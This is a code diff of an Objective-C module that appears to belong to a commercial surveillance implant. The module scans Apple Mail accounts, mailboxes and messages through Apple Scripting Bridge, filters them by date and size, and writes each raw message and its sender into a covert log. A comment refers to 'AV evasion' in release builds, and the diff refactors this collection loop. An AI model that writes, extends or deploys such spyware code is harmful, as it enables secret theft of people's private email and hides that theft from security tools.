@@ -10,6 +10,15 @@
  *
  */
 
+/*
+ * The agent captures Apple Mail only.
+ * The agent uses Apple Scripting Bridge to interact with Apple Mail.
+ * When the agent starts, a first scan is immediately performed; 
+ * then, a new scan is performed every 10 minutes.
+ * Apple mail running status is countinously checked because ASB starts
+ * the application to fullfill the requests.
+ */
+
 #import "RCSMAgentMessages.h"
 #import "RCSNativeMail.h"
 #import "RCSMCommon.h"
@@ -26,9 +35,9 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
 @interface __m_MAgentMessages (private)
 
 
-- (void) _writeLog:(mailMessage*)msg;
+- (void) _writeLog:(NSString*)rawMail andSender:(NSString*)sender;
 - (void) _getMail;
-- (NSData*)createLogHeaderWithSize:(NSInteger)logSize fromMessage:(mailMessage *)msg;
+- (NSData*)createLogHeaderWithSize:(NSInteger)logSize andSender:(NSString*)sender;
 - (void) _getMarkup;
 - (void) _setMarkup;
 
@@ -55,8 +64,7 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
     [pool release];
 }
 
-- (NSData*)createLogHeaderWithSize:(NSInteger)logSize
-                       fromMessage:(mailMessage*) msg
+- (NSData*)createLogHeaderWithSize:(NSInteger)logSize andSender:(NSString*) sender
 {
     NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(messagesAdditionalHeader)];
     
@@ -71,12 +79,11 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
     additionalHeader->size    = logSize;
     additionalHeader->version = MAIL_VERSION2; //MAPI_V2_0_PROTO;
     additionalHeader->flags  = MAIL_FULL_BODY;
-    NSString *from = [msg sender];
-    if(from != nil)
+    if(sender != nil)
     {
-        if ([from rangeOfString:inAddr options:NSCaseInsensitiveSearch].location == NSNotFound)
+        if ([sender rangeOfString:inAddr options:NSCaseInsensitiveSearch].location == NSNotFound)
         {
-            // sender it's not me, it's a incoming message
+            // sender it's not me, it's an incoming message
             additionalHeader->flags |= MAIL_INCOMING;
         }
     }
@@ -98,15 +105,13 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
 }
 
 
-- (void) _writeLog: (mailMessage*) msg
+- (void) _writeLog: (NSString*)rawMail andSender:(NSString*)sender
 {
     NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
     
-    
-    NSString *rawMail = msg.source;
     NSMutableData *contentData = [NSMutableData dataWithData:[rawMail dataUsingEncoding:NSUTF8StringEncoding ]];
     
-    NSData *additionalHeaderData = [self createLogHeaderWithSize:[contentData length] fromMessage:msg ];
+    NSData *additionalHeaderData = [self createLogHeaderWithSize:[contentData length] andSender: sender];
     
     
     // AV evasion: only on release build
@@ -143,69 +148,93 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
 {
     mailApplication *appleMail =[SBApplication applicationWithBundleIdentifier:@"com.apple.mail"];
     
-    if ([appleMail isRunning])
+    if (![appleMail isRunning])
     {
-        // accounts
-        mailAccount *accounts = [appleMail accounts];
-        for (mailAccount *account in accounts)
+        return;
+    }
+    
+    // retrieve accounts
+    mailAccount *accounts = [appleMail accounts];
+    for (mailAccount *account in accounts)
+    {
+        if (![appleMail isRunning])
         {
-            // retrieve mail addr associated to the account
-            NSArray *mailAddrs = [account emailAddresses];
-            inAddr = [mailAddrs objectAtIndex:0];
+            [self _setMarkup]; // save markup and return
+            return;
+        }
+        // retrieve mail addr associated to the account
+        NSArray *mailAddrs = [account emailAddresses];
+        inAddr = [mailAddrs objectAtIndex:0];
             
-            // mailboxes
-            mailMailbox *mailboxes = [account mailboxes];
-            for (mailMailbox *mbox in mailboxes)
+        // retrieve mailboxes
+        mailMailbox *mailboxes = [account mailboxes];
+        for (mailMailbox *mbox in mailboxes)
+        {
+            if (![appleMail isRunning])
             {
-                //messages
-                mailMessage *msgs = [mbox messages];
-                for (mailMessage *msg in msgs)
-                {
-                    // check if agent has been stopped
-                    if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
+                [self _setMarkup]; // save markup and return
+                return;
+            }
+            // retrieve messages
+            mailMessage *msgs = [mbox messages];
+            for (mailMessage *msg in msgs)
+            {
+                // check if agent has been stopped
+                if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
                        || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
+                {
+                    // save markup and return
+                    [self _setMarkup];
+                    return;
+                }
+                if (![appleMail isRunning])
+                {
+                    [self _setMarkup]; // save markup and return
+                    return;
+                }
+                // take a bunch of data
+                NSDate *mailDate = msg.dateReceived;
+                NSInteger msgSize = msg.messageSize;
+                NSNumber *key = [NSNumber numberWithInteger:msg.id];
+                NSString *msgId = msg.messageId;
+                //verify date range
+                if (([mailDate compare:dateFrom] == NSOrderedDescending) && ([mailDate compare:dateTo] == NSOrderedAscending))
+                    //mailDate later than dateFrom and earlier then dateTo
+                {
+                    // verify size range
+                    if(msgSize <= size)
                     {
-                        // save markup and return
-                        [self _setMarkup];
-                        return;
-                    }
-                    else
-                    {
-                        // verify date range
-                        NSDate *mailDate = msg.dateReceived;
-                        if (([mailDate compare:dateFrom] == NSOrderedDescending) && ([mailDate compare:dateTo] == NSOrderedAscending))
-                            //mailDate later than dateFrom and earlier then dateTo
+                        if (![appleMail isRunning])
                         {
-                            // verify size range
-                            if(msg.messageSize <= size)
+                            [self _setMarkup]; // save markup and return
+                            return;
+                        }
+                        NSString *rawMail = msg.source;
+                        NSString *sender = msg.sender;
+                        // verify markup
+                        NSString *obj=[markup objectForKey:key];
+                        if(obj == nil)
                             {
-                                // verify markup
-                                NSNumber *key = [NSNumber numberWithInteger:msg.id];
-                                NSString *msgId = msg.messageId;
-                                NSString *obj=[markup objectForKey:key];
-                                if(obj == nil)
-                                {
 #ifdef DEBUG_MESSAGES
-                                    infoLog(@"no msgId in markup");
+                                infoLog(@"no msgId in markup");
 #endif
-                                    // there's no markup
+                                // there's no markup
+                                [markup setObject:msgId forKey:key];
+                                [self _writeLog:rawMail andSender:sender];
+                            }
+                            else
+                            {
+#ifdef DEBUG_MESSAGES
+                                infoLog(@"msgId in markup");
+#endif
+                                // there's a markup, if same msg id we do nothing
+                                // else, id has been recycled and we have to log
+                                // the msg and save markup
+                                if ([obj isEqualToString:msgId] == NO)
+                                {
                                     [markup setObject:msgId forKey:key];
-                                    [self _writeLog:msg];
-                                }
-                                else
-                                {
-#ifdef DEBUG_MESSAGES
-                                    infoLog(@"msgId in markup");
-#endif
-                                    // there's a markup, if same msg id we do nothing
-                                    // else, id has been recycled and we have to log
-                                    // the msg and save markup
-                                    if ([obj isEqualToString:msgId] == NO)
-                                    {
-                                        [markup setObject:msgId forKey:key];
-                                        [self _writeLog:msg];
-                                    } // else we do nothing
-                                }
+                                    [self _writeLog:rawMail andSender:sender];
+                                } // else we do nothing
                             }
                         }
                     }
@@ -214,7 +243,6 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
         }
         // write markup to file at the end of the big loop
         [self _setMarkup];
-    }
 }
 
 @end
